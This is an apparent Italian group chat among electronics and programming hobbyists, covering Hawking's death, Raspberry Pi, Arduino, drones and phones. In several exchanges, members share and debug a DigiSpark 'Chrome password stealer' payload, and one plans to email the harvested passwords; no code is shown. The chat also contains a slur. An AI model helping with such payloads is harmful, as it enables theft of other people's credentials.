o meglio seminuovo... stesso processore overclokato e wifi/ethernet migliorati
Per chi non segue i giornali: stephen hawking è morto
Rip
Avevo letto su La Repubblica stamattina
Solo lui poteva lasciarci nel Pi Day
Lo stesso giorno in cui è nato einstein poi
Ciao se riesci a trovare uno sketch funzionante ti andrebbe di passarlo? Ci ho provato a lungo senza riuscire
Ciao ragazzi
Eh l ho provato ma non funziona
ma non lo carica proprio?
Utilizza questo 
No nel senso che sketch semplici tipo blink li carica... Quelli da Rubber ducky sono pieni di errori e non riesco a farli funzionare
Utilizza il compilatore che ti ho inviato
Appena posso provo grazie...ma nessuno di voi ha un codice già pronto per digispark e soprattutto senza errori da passare?
purtroppo no
Io ho il Chrome password stealer ma non sono a casa
Se ti ricordi passalo quando puoi 
Ti fermi molto a Torino?
Fino a dopodomani
Se capito a torino ti offro una 
Anvedi la somministrazione di alcol a minori 
pensa fino al 2015 c'era una legge in italia che permetteva di consumare alcolici da 16 anni
E io non l'ho saputo? 
Mmm.. Consumare non comprare
da quel che ricordo te potevi bere al bar ma non comprare nei negozi, adesso riguardo
Nono l'avrei saputo


 correggi l'ultimo post overvolt..c'è un errore di battitura..colpa mia, troppa fretta
Se lo correggo scompare l'immagine... se vuoi elimino
"adattori"  vado a prendere gatto a nove code e cilicio
Ah ma si ahhaha non ci si accorge nemmeno
 maledetta fretta
e YouTube anche oggi si è dimenticato la notifica push..vabbè, ormai è diventato una barzelletta peggio di Apple
A me è arrivata
cazzate..vadano a spiegarlo ai baristi che vendono le birrozze ai 14-16enni il sabato sera, oppure ai tabaccai che vendono le sigarette ai ragazzini con la solita scusa "mio padre è in macchina, un pacco di Marlboro Rosse per favore, è in doppia fila"
Mai fidarsi di internet
sul telefono nada, Winzozz e il tablet invece si..boooooooooooooooo
Devi comprare il codice penale
è il c.p. se lo cerchi l'art. 689 dice cosi su qualsiasi sito tu vada
🤔 me lo segno e lo faccio controllare alla suocera avvocato
Mmh non mi fido cmq
è il Codice Penale quello
Ehhh chissà chi l'ha scritto
direi che il Sole 24 Ore sia abbastanza affidabile come sito..http://
comunqe si in generale anche nei supermercati soprattutto i mini market non si fanno problemi a venderti alcol, a volte quelli che fanno piu resitenza sono i bar perche rischiano molto di piu che qualcuno li vede e che gli facciano il culo
Eeeeh chissa chi c'è dietro
a me è successo il contrario invece..a 22 anni una stangona russa mi ha chiesto la patente in un chiosco in spiaggia, pensava avessi 17 anni
Ti giuro che il mio cervello ha letto "adattatori"
comprati il libro, che vuoi che ti dica
🤣 prendo il cilicio

sono fuso..ho sbagliato anche Spigen..ho scritto Spingen  non ci sono con la testa oggi

Benvenuto
Ma l'ho inserito proprio oggi nel mio tema d'Italiano  

Grazie 
porti sfiga...
Qual è?
Sparrow
Ragazzi qualche progetto non troppo difficile con raspberry?
Sai programmare in Python?
Si
Puoi fare di tutto
Me ne serve uno non troppo difficile  per la scuola
Una Farming Station?
Cioè?
Controllare il livello di secchezza e temperatura di una certa pianta o di un orto intero
Che editor consigliate per buttar giù qualcosa in Fortran?
No credo sia un lavoro troppo lungo
E che chiede dei sensori appositi
Non tanto, online si trovano progetti simili
Altrimenti la classica domotica
Cose block usavo io
Per controllare la resistenza del terreno no
Ma intendo un progetto ad esempio un cloud o cose simili
Ah, informatica
Si esattamente
Allora il raggio si estende
Crea una piattaforma che gestisce un servizio
Per esempio?
Una piattaforma che organizza i libri di una biblioteca
Potrebbe starci, hai altre idee?
Parti da qui
Qualcuno può aiutarmi ho acquistato un Arduino micro usb ma quando lo inserisco nella porta il pc lo rileva ma se vado nell'arduino ide  e vado nella sezione porte non lo trova
Ok bene
Marco io pensavo di attaccarla alla ricevente del radiocomando
Perché da lì passano 5V dunque vanno bene
Please help me
Installa i Drivers
Eh ma quali
Ho cercato dappertutto ma non li trovo
Quelli della tua scheda, ci dovrebbero essere le specifiche sulla pagina d'acquisto
Ora ci guardo
Non ci sono
Quando hai installato l'IDE, non ti ha fatto installare anche i driver?
La mia funziona perfettamente
No
Usa i payload della rubber ducky originale, e convertitili nel linguaggio del DigiSpark, usando questo convertitore 
All'interno della cartella di installazione ho trovato dei driver e li ho installati ma comunque l'ide non vede il dispositivo
hai riavviato il pc?
Si
Qualcuno ha un idea?
Nuuu
E dove la metto? Ahahha
Benvenuto
Grazie
D'accordo!
Ma come fai ad attaccarla direttamente alla batteria? I cavettì non si collegano tra di loro..
Decisamente no 
Stephen Hawking è morto il giorno in cui è nato Einstein, Stephen Hawking è nato il giorno di morte di Galileo
Questa cosa mi sta facendo preoccupare
Oggi è il PI greco day anche
Quelli di hak5 su github?
Ah hmmm è quello piccolo
... 
Sigh... Hawking era un po' il mio mito
Cioè mi piacerebbe fare ricerca nello stesso ambito suo
Bellissima ahah
Quindi astrofisica?
Yup, in particolare arrivare a una formulazione quantistica della relatività
Quindi come potrei fare?

Marco non ha pacco di scrivere oggi 
Siiii ahahhahahah
ma non c'è più il bot che scrive i messaggi vocali
Dai diciamo che te hai capito male, ma io non mi sono spiegato bene 
Comqunque il cavetto non entra e L'ho saldato a un cavetto che avanzava del Naza che entra nella ricevente dell'rc
Scusate se mi intrometto 

Ma con uno step down conveter  non è più semplice il lavoro?
Hahah per questi due vocali l'ho stroncato perché interessavano solo Claudio
Questo sarebbe il capolavoro (che non funziona)
Non deve essere male eh
Rosso: 5-36V    --> Rosso
Nero: GND         --> giallo scuro
Giallo: Video     --> marrone
No, una figata
Wait a sec che sono chiuso in una cabina per fototessere
AHAHAHHAHAHAHAHHA
Secondo me stai cercando di staccare qualche cavetto come di tuo solito...
Uuuh dove?
Cognola... 10€ mi è toccato mollargli
Ahaha peccato perché ero alla stazione
Ho detto magari lo becco
Si
73.50€ di marca da bollo, 44€ di bollettino postale e 10€ di fototessere... E il tutto perché alle elezioni hanno vinto lega e m5s 

Povero...
E tutto questo, nel giorno del Pi Greco
Ah è vero
Troppe coincidenze
Io mi voglio laureare il girono della nascita di Hawking
ma hahahahahaha
Uhm... sloggi? 
Vediamo se mi danno il diritto all'espatrio
e i raduni in questo bellissimo paese poi? 
TUTTI IN SWIZZERAAAA
Prendi cittadinanza Svizzera? 
Pensavo scherzassi...

puoi prendere la cittadinanza elettronica estone volendo
 pretendo il giveaway del nuovo pc
E superato anche quello successivo ☺️
Conoscete qualche app per tenere conto del caffè bevuto ?
Usavo Up Coffe ma l’hanno rimossa da Apple Store
S health se hai samsung, altrimenti Foglio di Carta, che dall'Impero Cinese fa il suo lavoro senza bug
Hahahahhha
a proposito ma che fine ha fatto l'i9
Non ha proprio iniziato
🤣
Pesce grosso mangia pesce piccolo, io mi becco un 8700K
come se fosse una pena
Sono senza parole
Ho appena scoperto che solo 5/6 persone conoscevano Hawking nella mia classe
Su 23
questa era la situazione sta mattina nel mio gruppo
indecente... quanta poca cultura
Quante mazzate sono volate?
Vabbè ma è "un po'" da ignoranti... Tralasciando il fatto che quando lo hanno detto nella mia classe alcuni hanno risposto con "ah quello down?"
E siamo un liceo scientifico.....
lasciamo stare
Da me è partito un dibattito allucinante
Un mio compagno diceva che non è giusto dare così importanza alla sua morte perché ogni giorno muoiono tante persone e siamo tutti uguali.
Ahahahahah
Bel pensiero il tuo compagno
Il mio ragionamento era quello parakdno del calciatore
Ma non puoi metterlo a confronto con Hawking
E tipo io che gli davo del bolscevico dicendo che Hawking è  stato di grande aiuto per l’umanità
Beh abbiamo perso una grande mente...che avrebbe potuto fare molto
Nella mia eravamo in tre a sapere chi fosse su 25🤦‍♂️🤦‍♂️🤦‍♂️
Liceo?
si
non c'entra nulla la scuola
Ma ricordare una grande personalità dell'ultimo secolo come lui non è affatto in contrasto col dire che siamo tutti uguali... Il tuo compagno spero capisca che se ogni giorno al tg si facesse un servizio per la signora Pina moglie di Gino, per Toni, per tutta la gente che muore insomma non si capisce più nulla
Teoricamente dovrebbe
anche in un professionale la gente dovrebbe conoscere Hawking
no
Se vai un liceo dovresti come minimo sapere chi è Hawking
Ma dai
Infatti
Soprattutto uno scientifico
No vabbè da me lo sapevano tutti
Non per screditare il tecnico eh
Vado orgoglioso della mia classe
come ragionamento non ha senso
ma va bene
no è cultura generale dovrebbero saperlo tutti a prescindere dalla scuola frequentata, se non sai neanche chi è certa gente vuol solo dire che sei un gran ignorante
Vi piacciono?
Quindi 
 cosa potrei fare con la Runcam?
a parte la gomma marrone davanti si
È l'elemento caratteristicho
ha alquanto senso, noi a scuola nelle ore di fisica guardiamo roba riguardante quella gente li...per lo più astrofisici e astronauti tipo la cristoforetti ma si, ha senso
semplicemente non ha senso perché non devi vederlo a scuola per sapere chi è Stephen Hawking
se non conosci Hawking sei veramente un cazzo di ritardato
Questo nel tuo mondo ideale
ora, pensavo di mettermi a fare un paio di esercizi sul momento d'inerzia e momento della forza avendo appena iniziato le rotazioni e non avendo io capito un caxxo....ma credo che leggerò il mio librozzo di elettronica
Il problema che oggi siamo tutti ritardati
Quindi ci si adatta
Vabbè ma se ti dico Calamandrei, a che pensi?
vabb, noh, non è detto, c'è chi non lo conosce, tranquillo
Mai sentito sinceramente
Al politico
Appunto
Non è che ci sia da scandalizzarsi
Vabbè ma lui non è Hawking
Ah no beh, è tra i più importanti padri della costituzione italiana
Ma chi è? Adesso voglio saperlo
Oltre ad aver pronunciato un magnifico "discorso ai giovani"
Sicuramente importante ma sicuramente meno di Hawking
Soprattutto per quanto riguarda il piano internazionale
Hawking che ha fatto? Un paio di teorie sui buchi neri, e poi?
Teorie che se non sei del mestiere manco capisci
(Hawking è uno dei miei miti eh)
emmhh...non è che sia meno importante di hawking, solo che hawking è contemporaneo e lo trovi nei giornali spesso essendo tale, gli altri un po' meno
Fai partire degli audio nella live

Tipo !cosevarie
Un paio di teorie?
mahonna
Per le connessioni, dicevi? Lo spinotto tra cam e TX dovrebbe essere abbastanza easy, doovrebbe andare in ogni maniera. Per l'alimentazione del TX basta che guardi che dicono sul sito
Se non conosci Hawkwing decisamente vieni da un'altra epoca
E questa è talmente fine che non posso non citare 
 , 
 e 

Eh
Ecco 
Due bei cannoni con i coriandoli
La tx ha già corrente, solo che non funziona se la collego alla cam
Vedi, ho fatto questi collegamenti ma non vanno bene
Perché nella tx non so dove devo mettere il GND e gli altri..
Sono d'accordo
Fuori da qui. Subito. 
Smithers, libera i cani

LOL
Spero non ci sia il mio nome fra i tuoi ricordi di facebook
Con cosa è fatta?
Col telefono
Mazza
Che hai?
Huawei P10 lite
Minchia
Ahahahahah
Le fa strabene

Voglio condividere con voi quello che abbiamo fatto con un supplente oggi

Tutto merito del fotografo
Ahah eh bhe
Adoro 
Che superiore fai
C'era una bestemmia di troppo

L'ultima era straordinaria 
Scientifico
what
Ahah ha esatto
Beh sei fortunato ad avere uno scientifico "così" diciamo
ma su questo gruppo chi stava lavorando alle api di zozzap?
Ma solo nel mio liceo non avrebbero mai permesso una cosa così?
Cioè vorrei capire se è il mio liceo che fa schifo perchè sono tutti seri
Il bello che il botto si è sentito in tutta la scuola
Ma sai il casino che è successo dopo 
 Voglio lui come nonno adottivo
Che anno?
Ahahahahahah
primo 
Idem

Nel mio liceo il professore ha dato fuoco a una parte di tavolo
Cioè nella mia scuola si sarebbero lamentati del cappuccio in classe, dell'avere il telefono in mano e ancor di più di registrare, della bestemmia, della gente che parla, della gente che urla, non avrebbero mai fatto un esperimento così tranne nel caso che fossimo tutti dentro una fortezza fatta di cemento armato... cioè mi sembra strano che sia un liceo. Comunque lo sognerei un liceo così sinceramente
anche da me 
noi l'hanno scorso a chimica abbiamo distillato del vino.... meno mele che era illegale ma soprattutto che esplode 
pure noiii, non ricordo se fosse vino o caffè ma alla fine è esploso e ha riversato tutto sul libro di certa gente in classe mia :DD
noi l'avevamo fatto l'anno scorso o 2 anni fa, non ricordo
da noi era vino e poi la prof per far capiere che si era distillato l'alcol ha versto su un banco il vino e sull'altro il distillato e ha provato a dae fuoco a entrambi, ha preso fuoco un quaderno
,secondo voi è buono condito lasciate stare che devo correggere gli errori grammaticale

L'autismo
Scarica un programma apposta per piacere ahahahha
Ti consiglio Atom
Comunque se fai una foto fatta megloo te lo guardo ahahhahaha
Ok
Te la mando in privata
Devi considerare che questo è un supplente
La mia prof di latino si lamenta se dici “Arrivederci” invece di “Arrivederla”
Dille Ave e sei a posto

arrivedervi?
arrivederli?
Arrivederrimo
salutala con "ciao" o "arrivedendosi"
se qualcuno avesse tanto tempo libero

che bello, ora posso calcolare l'area del cerchio con una precisione di un micrometro su un cerchio di raggio 10cm
ahahahah
sarebbe stupendo
anche se nonn so quali calcolatrici rieacano a supportare 100.000 cifre
solo calcolatrici particolarmente evolute per scopi scientifici
Cosa assolutamente inutile 
Ommioddio vomito
Se proprio non sai web developing usa un cms
python 
penso che di base supporti double float a 64 bit (se installata la versione x64 oiamente)
Oppure guardi i tutorial di overvolt 
dagli tempo

placement
maaa, un tempo non avesti fatto un vlog mentre filmavi i tuoi schiavi programmare in cpp usando opencv mentre tu mostravi il robottino che rilevava le palle verdi tipo?
Nuovo video! 
 

 
 
Guardalo ora! 

Eh? Hahahha
Wee Marco
Poi magari domani mi rimetto con il drone e ti chiedo due cose
Dimmi solo se va bene, non mi offendo ecco ahahahah
Non ti pago mica
dov'è sparito quel video
I miei dissipatori 
Non il tipico topic di questo gruppo ma... Qualcuno mi sa spiegare la banda bianca in basso? Mi è comparsa a caso (già provati professionalissimi tentativi quali riavvio e spegni e riapri chrome)
Sul primo schermo no probelma
Sembra la stessa finestra del analizza elemento
Magari ti si è buggata
Prova a reinstallare il browser
Può darsi, ma trascinando la finestra di chrome da uno schermo all'altro scompare il problema
La tento così
Qualcuno sa perché non viene stampato nessun output e il programma finisce subito?
perchè print e println fanno schifo :D
non ho mai realmente imparato ad usarli, ma non credo tornerò mai a provarci
Se è under18 una Fanta
boh io lo studierò a scuola in teoria
Buona sera
Ma ahahahah
Li avevo già usati per altri programmi sempre in Kotlin e funzionavano
Volevo provarlo e sto seguendo un corso online
cocker oppure setter irlandese?
Cocker secondo me
benvenuto
Qualcuno della zona può confermare?
Ahahaha
Benvenuto, sei riuscito a trovare eh 
Non c'è la storia di Roberto
Eh?
La tua storia nelle gare della robocup
Eh beh marco non la sa tutta
Avevo già fatto due robocup quando marco è arrivato a Trento
Actually dovresti averlo visto in qualche clip e/o foto
Perchè i, y e c sono NULL, devi inizializzarli prima 
Ieri
Cioè dal primo anno?
Allora provata?
Siii
Facilissima da calibrare
La provo meglio oggi
Incrocio di incroci di incroci
Dogana?

bella..fa anche da incisore?
Sattoh
Quanto ti sembra grande?
Nop
Nulla
All'ultimo anno hai costruito  ultron?
Nono... Il robot del ❤ è hopper
Spero marco ne abbia parlato
, 
 riconoscete mica Hopper? 
Comunque su yt non c'è praticamente nulla di robotica
Eh no, marco non aveva ancora la fissa
Ciao. Come posso sapere la versione hardware di un adattatore wireless se non ho lo scatolo?
ci dovrebbe essere scritto qualcosa sopra
Si
V2
Ma sul sito posso scegliere solo v1 o v3
che marca è?
Tp link
prova ancercare su Google il modello preciso piuttosto che andare sul sito
L ho trovato
Ma come faccio a scaricare il driver se non so la versione?
Ma nemmeno ora non c'è nulla di robotica su yt 
Eh ma marco non fa più robotica al liceo 
Il drone mica lo avete fatto al liceo
Ma infatti c'è su YouTube
Era per dire che non importa essere al liceo per per parlare di robotica
Aah no pensavo dicessi robotica robocup
Ne avevi sentito parlare, se non sbaglio è un modello di tp link che non vendoni più su Amazon, però è buona
Confermo.....
Ottimo, mi trasferisco lì... 
 vieni anche tu?
Settimana scorsa hanno anche vinto 1 milione di € a Carpi
Un motivo in più
Ah aggiungerei anche che l'anno scorso un gruppo di ragazzi hanno rubato un bus e sono entrati a scuola con quello sempre a Carpi
Ahahahah
Uuh lo ricordo
Ottimo, mi trasferisco
Anche voi di Carpi?
Non proprio ma sempre in zona  Modena
 pigliamo un bilocale?
Non potevo perdermela !!!
Buongiorno a tutti. Avrei una domanda su Arduino. Utilizzando un Arduino uno r3 riesco ad utilizzare contemporaneamente sia il bus i2c (seriale) che la comunicazione Spi(mi pare che sia questa la comunicazione in parallelo) ?
Ma cos'è sto carpi? una nuova meme? Non ho capito
Hahahah
No boh ieri avevo trovato quella foto
Questo è l'evento che ti dicevo... notare come troneggia tra gli sponsor il logo overVolt 
Dove? 
Oh shit il link
Hahahah che mona 
Ahahahahahahaha
Rispondimi in privataaaaa
Eh se cerchi un testo non trovi i PNG 
Io non lo vedo 
Sarai falzooo
Faccio pulizia Kontattïìî
Se ci sono queu loghi, non me li carica
Manco a me
Hanno
Beh s'è tagliato il pelo e si è aggiornato, di sicuro è al passo con i tempi
(Ma è al passo o al balzo?)
Balzo
ho provato ad aprire il link da pc, ed effettivamente ora carica gli sponsor e compare overvolt
Ghombloddo
Dopo lo guardò meglio al massimo mi iscrivo
Ops correttore ahaha, non me ne ero accorto
  idee per come installare la libreria slycot di python su Windows serve pure un compilatore fortan
Step 1) installare una distro Linux

Boh mai sentita... Ma con pip non va?
se c'è su pypi basta usare pip (c'è anche su windows)
Mi sa che conviene...
Eh non ho il compilatore fortan lol
se proprio non vuoi fare un dualboot, usa wsl
pip non ha bisogno di compilatori o simili
Io devo installare la libreria control però per delle cose ha bisogno di quest'altra
ma hai già i 2 comandi per installare le librerie in alto
Non vanno
Cioè control va, l'altro no
usi python 2 o 3?
3... Va beh lo ho su conda... Magari faccio una macchina virtuale con una installazione per bene
allora usa pip3 e non pip
Non penso sia quello il problema, l'installazione parte ma da un errore
e allora... manda l'errore
Dopo ora sono in treno.
Della serie "installate anaconda e control"
Ah non vi va? Su Mac funziona... LoL... Va beh risolvetelo da soli per casa ahahah
lol
Che poi anaconda è comoda ma da un sacco di problemi, però spyder è comodo come ide da utilizzare tipo matlab
io non uso ide, preferisco usare editor semplici e poi usare la console per eseguire
beh pycharm è un IDE fatto veramente bene
ovviamente per python si intende
 resta il fatto che la ram scarseggia, le periferiche usb e lan hanno linee condivise e che non è presente l'usb3. Poco tempo fa ho "scoperto" una board chiamata Rock64 che a parità di prezzo è molto migliore di spi3 (unica pecca è l'assenza di wifi e bluetooth, per il resto è molto migliore di rpi3)
Avete visto il nuovo Raspberry Pi3 B+? CPU più potente del Pi3, aggiunto WiFi 5.8GHz, upgradata la porta ethernet a Gigabit (fasullo in realtà) e upgradato il Bluetooth alla versione 4.2... Una bestiaccia che con la sua potenza potrebbe aprire la possibilità a progetti interessanti 🤔
Ne parliamo oggi in live, direi alle 21:00-21:30?
Ma se! 4K 60fps HDR dicono che regge
prova a confrontare rpi3 e rock64 (il 3b+ non lo considero perché verrà venduto ad un prezzo di sicuro superiore al 3 normale)
Eh ma io uso la consolle ipython, deve essere veloce come MATLAB, deve essere una calcolatrice
Mi faccio mandare 2-3 di sti rock così ve ne regalo
"veloce" e "matlab" non stanno bene insieme
LoL insomma devo installare sto cosoahahhaha e mi piace come ide spyder
Sai qual è il downside di molte di ste board alternative? Che non possono essere alimentate con la fucking USB
ecco, il secondo di 2 lati negativi
Confermo... Orange Pi ha un connettore dc
anche che hai molta meno community
raga aiutatemi a cercare la persona che ieri mi ha chiesto lo sketch della rubber ducky
dietpi is the way, c'è per quasi tutte le board esistenti
si chiamava Salvatore ma non trovo il tag
Anche armbian è compatibile con moltissime
Li trova in internet... A 10:00 del video non ho censurato apposta l'url dove trovarli
aveva problemi avendo una DigiSpark e mi aveva chiesto di passargli lo sketch funzionante
trovato nulla <£
Ma sapete che io con DigiSpark ho avuto problemi?
Anzi.. .
Ho probelemi
Ottima idea 
  chi cerca trova
sei un tesoro
Ma solo a me non funziona il convertitore per il DigiSpark?
ancora con linux?
Si
utilizza quello che ti ho inviato io
Tu hai provato a caricare il codice da GitHub?
ho utilizzato quelli di Darren Cucina
Qualcuno ha il pdf di algoritmi e programmi,richiami di teoria con prove d'esame di Camurati e Quer?
Si, ma poi come l'hai "tradotto"?
Io no
Chiedi a korry
utilizzando il compilatore che ho inviato, quello su GitHub




Chi e'?
vanno modificati i caratteri strani perchè mi sa che utilizza un layout diverso da quello italiano
Io ho provato a seguire il video di romboli, ma poi quando vado sul compilatore duckduino o qualcosa del genere non funziona
perchè sono due board diverse e utilizzano librerie diverse
quello che avevo inviato io è un compilatore sia per arduino che per DigiSpark
Niente miband 3, solo un update per lo smartwatch
Dove?
Molto probabile
伤心 
Io non sarei felice della gente che mi accende e spegne le luci durante le live 
È lo stesso che ho usato io
Per me non la faranno mai
Hai selezionato DigiSpark?
Ma ti ho triggerato vero?
Grazie, appena arrivo a casa ci provo
Devo prendere il telefono nuovo e allo stesso prezzo c'è:
Garanzia Europa no brand
Garanzia Italia brand

Secondo voi qual'è il miglior compromesso
Ma sì, hanno già ottenuto la certificazione bluetooth un mese fa..
Ma che senso ha fare amazfit, yi etc
Update per il mi band 2?
Sono tutti sottobrand di xiaomi, però sono aziende abbastanza indipendenti
 funziona! Adesso devo solo riuscire a caricare i  Driver
Mi, Mija, Yeelight, Huami, Xiaoyi, Ninebot (ex segway), Aqara...
E cambiare i caratteri speciali, fai tipo uno sketch in cui ti printi cosa corrisponde ogni carattere
Cos?
Si son circa un centinaio
Da quanto non caricate sul blog?
Se tipo tu metti / ti printa ¢
Comunque human safari è venuto al Galilei perché conosce Bombardelli
E così via
Adesso devo "solo" caricare i driver
Stamattina no?
Poi è fatta
Ma che Payload stai usando?
Si, ma in teoria parte subito. Era per strada perché sta andando in Germania
Adesso lo devo ancora scegliere
Comunque credo che userò il classico
Cioè
La classica Rubber Ducky
Solo che poi le password le mando via mail
Sisi mi ha detto
Gli avevo chiesto se si fermava per un giro coi droni... non che la giornata sia delle migliori...
Ahh, mi dispiace
Comunque bombardelli mi ha detto che ne verrano altri l'anno prossimo
Marco Tommesani:
Buongiorno qualcuno conosce la libreria paho mqtt di python perché vorrei creare un bot Telegram che in base alla richiesta da parte dell'utente lui legga con paho un topic salvi il dato in una variabile e lo ritrasmetta a Telegram non riesco a capire come implementare nell' esempio di paho il salvataggio dei vari topic nelle varie variabili
io direi garanzia europa
Ce ne sono milioni
Perdonami, ma non mi è molto chiaro quello che devi fare. Se ho capito bene, dovresti creare un client che riceve tutti i messaggi (basta usare una wildcard) e poi li inoltra a telegram. Questa non rappresenta una soluzione ottimale perché in caso ci dovessero essere molti messaggi, potresti rallentare il client. Sarebbe meglio riscrivere modificare il broker (magari mosquitto visto che usi pagò)
Come vi sembra?
In pratica io ho un bot Telegram creato con telepot e dovrei fare in modo che se mando un messaggio da Telegram al raspberry con scritto esempio 'temp' lui vada a pescare la variabile temp dove all'interno trovo la temperatura letta da un topic del server mqtt
buono
550 chiedono
Mi conviene prenderlo o montarmene uno?
direi montarlo
Quanto mi costa per una configurazione del genere?
se sei bravo 450 ca.
Mmm
Con scheda grafica inclusa?
Ma queste inquadrature di Galeazzi?
Avete visto il nuovo Raspberry Pi3 B+? CPU più potente del Pi3, aggiunto WiFi 5.8GHz, upgradata la porta ethernet a Gigabit (fasullo in realtà) e upgradato il Bluetooth alla versione 4.2... Una bestiaccia che con la sua potenza potrebbe aprire la possibilità a progetti interessanti 🤔
Ne parliamo oggi in live, direi alle 21:00-21:30?
Rip 6GB che mi rimangono
Comunque ho appena trovato un negozio con i vinili di Sfera Ebbasta.
Sexy
ovviamente no, intendo come quello
ma per la GPU visti i tempi che corrono andrei sull'usato con le  invida serie 900 o le 700
Virtualbox o vmware?
VMware senza nemmeno pensarci
Bomba
Movimento sensuale
Ok
stesso prezzo
Da quando ho troppo da studiare  Questo weekend dovrei essere super-operativo
Comunque se dovessi comrare una board andrei di rock64 per la quantità superiore di ram, le periferiche su linee dedicate e la possibilità di usare memorie emmc o come si chiamino
insomma..non ho il metro, ma ad occhio direi 60-70 di altezza e 40-45 di larghezza..il piatto mi sembra da 20
Mmm a me sembra molto meno ad occhio, guarda rispetto all'HE
io intendo altezza della carcassa, non di area di lavoro
Sorry, io intendevo il piatto, non è sicuramente 200. Sarà tipo la metà.
ah ok capito
hai ragione, è una 100mm
 eccola qui  dai per il prezzo che costa non è malaccio..certo il piatto è piccolo
Ti lamenti pure?
🤔 sicuramente hai qualche impostazione sbagliata sul router..che frequenza usi? sia la 2.4 GHz sia la 5 GHz oppure soltanto una? perchè dipende anche dalla conformazione della casa e dai muri
Per me la metà
si infatti è una 100x100 mm, ho controllato..ho messo anche la scheda prodotto su..cmq dai non è male per il prezzo pagato, ed è anche bella robusta come struttura..per iniziare e per piccole cosa va benissimo
Ma la Gigabit da un privato serve veramente? Io con la 180 mega sto stra fresco
beh, costa uguale alla 200 mega, mi sembra ci siano circa 5€ di differenza tra i 2 abbonamenti..a questo punto tt la vita la gigabit
 come fare contento Sheldon Cooper ora me la scarico
Non sapevo che ci fosse così poca differenza nel costo
Dipende dal tuo dispositivo
Io aspetto hacking, sinceramente ho anche un progetto interessante per Arduino
calcola anche che la gigabit vodafone è presente in pochissime città
No infatti io me la sogno. La ho solo a scuola
io ancora ho la 20 mega che va a 9-10
da noi a scuola hanno piu connessioni 200 mega unite insieme
Vabbè io fino a 3 mesi fa avevo una 7 mega che andava a 2-3 mega 
Se per Torino vedete uno che ha il telefono incollato alla faccia e il cappuccio che lo nasconde sono io che inserisco i dati della carta di credito 
Se un domani ci sarà un eventuale flop delle criptovalute,  il mercato sarà invaso da GPU a basso prezzo?
Cosa si possono usare a fare oltre a realizzare pc da gaming?
Oggi piove a Torino, purtroppo
Lo so
A meno che le crypto non scompaiano proprio (impossibile direi) conviene che il valore salga
Ed è la terza volta che mi si presenta davanti uno che vuole "soldi per i bambini senza papà"
Così i miners cinesi vendono il minato, vendono le GPU per rientrare in parte delle spese sostenute a inizio 2018 e il mercato si satura
mi sembra che dei francesi si siano inventati il macchinotto fabbrica bitcoin che fa da stufa
Palesemente un coglione che non sa come prendere più soldi e si mette a truffare, poi prima mi ha chiesto di cambiargli degli spicci con delle banconote ed è scappato con 10€...
E per cosa puoi usarle... Puoi farci dei cluster di computazione niente male 
O quando fai live su YouTube in 4K
Che tanto nessuno vedrà in 4K ahahah
Gli altri con la gigabit 
Che pirla dai 
Ma io le guardo in 360p 
che tristezza
Ma se non hai uno schermo in 4K?🤔
e poi ci sono io che metto tutto in playback in 1440p
Beh metti comunque in 4K per schifare i poveri
perchè togliere uno 0 togliendo da "automatico" a "144p" è troppo da poveri
KKKK
Oppure compri la televisione 50" 4K HDR che ho pubblicato stamattina nelle offerte
Quella non è male per niente
Della "Aió"
A proposito di povery, quel lezzo di Toto ha una nuova macchinina
oppure metti nelle impostazioni nvidia la dsr a 4k solo per poter mettere in 4k
È già tanto se ho il fullHD sulla mia
Come farsi rubare la macchina, Toto lo stai facendo bene
Volvo 
Snowden 2 - la vendetta
🤔allora è il router..controlla bene le impostazioni
 l'Iphone X cinesone
Mica tanto cinesone
si lo so, era una battuta  cinesone di qualità dai..diamo a Huawei quello che è di Huawei
Ma quanto stalkera Google
Peggio di Windows

 Nello store ufficiale di Honor ci sta Honor 8 in offerta a 199€
Un affare
A proposito di telefoni
Penso di essere entrato in fissa con l'S9
Fermatemi prima che faccio minchiate e lo compro
compralo nel dubbio
non fare minchiate..se proprio devi o vuoi cambiare telefono aspetta la presentazione di OnePlus 6
my two cents
Ma mi parlavano male di OnePlus qua dentro
Non prenderlo, ha un casino di bug, l'ho dato via dalla disperazione!!!
Galaxy S9?
Ma non è uscito manco da 2 giorni 
ma quando mai, sono ottimi..anche il Nokia 8 e il Mate 10 Pro sono ottimi, li ho provati entrambi
Nokia 8 = Android Stock 
Boh ti facevo desistere
Sì ma hai visto quante falle di sicurezza ha OOS?
se vuoi un telefono senza bug e falle ti conviene prendere un 3310 di prima generazione
Prima si scopre che raccolgono dati non anonimi sugli utilizzatori, poi si scopre che attraverso un'app preinstallata si possono ottenere i permessi di root a gratis...
su Oxygen? non lo sapevo..io comunque credo proprio che per il prossimo telefono virerò su Nokia 8 oppure Nokia 6🤔dipenderà dal budget, ma Android Stock lo adoro
Tieni a bada la scimmia per due mesi e poi liberarla
Non mi sembra, comunque a parte necessità particolari, è il migliore.
Io prendo s8+
io ho il OnePlus 5t, va da dio
lo so, lo possiede mio fratello..io invece prenderò quasi sicuramente il Nokia 6, Android Stock mi piace troppo come sistema
Che ci fa un ricco sotto le case popolari?
🤔ma è sua oppure in prova come la BMW che aveva mesi fa?
guardando la targa direi chebè un noleggio a lungo termine come la v90 di keledan però non sono sicuro
🤔si in effetti potrebbe essere in leasing
no è leggermente diverso,dopo il leasing di solito si compra mentre nel  noleggio hai un tot di km massimi in piu hai inclusi vari servizi, assicurazione,bollo e a volte cambio gomme
Palesemente in prova
Ma sarà tipo una settimana, sicuro non a lungo termine
Non prenderò mai in nokia
Che ti dice la targa?
Si, io ☺️
Brutto... Retro in vetro nero specchiato e davanti col notch
Ma con cosa? L'unica cosa decente è la fotocamera, il resto nulla di nuovo
mi sembrava troppo strano..hai visto il video del setup fotografico? mamma mia che macchina assurda che si è assemblato
Si, e quasi tutto gratis
c'è sempre il 5t volendo, siamo li come prestazioni rispetto ad S9..testati entrambi dall'Architetto
🤔la GH5 e il Rode mi sembra li abbia acquistati lui..non so invece per quanto riguarda obbiettivo ed accessori
GH5 cosa, ha la 6500
La GH5 è di Tom's pagata da Tom's
 lo so..è il correttore automatico della GBoard che interpreta a modo suo
la Sony 6500 è comunque una grandissima macchina eh  non è scarsa
che è stata immatricolata piu di un anno fa quindi era già stata immatricolata, e siccome fino ha poco tempo fa aveva lxc 90 vuol dire che o e un auto a noleggio (breve o lungo termine che sia) di proprietà di un azienda o di un concessionario o che è stata comprata usata
Lo soooo

A-haa
vabbè dai in fondo in fondo la Canon non è malvagia..se ti vuoi fare il set simile al suo lo puoi fare tranquillamente con quella un bel Manfrotto per iniziare
Sto aspettando che esca la A7III su amazon
Perché la Canon ha la forma diversa e non ci sta nello stesso SmallRig
☺️
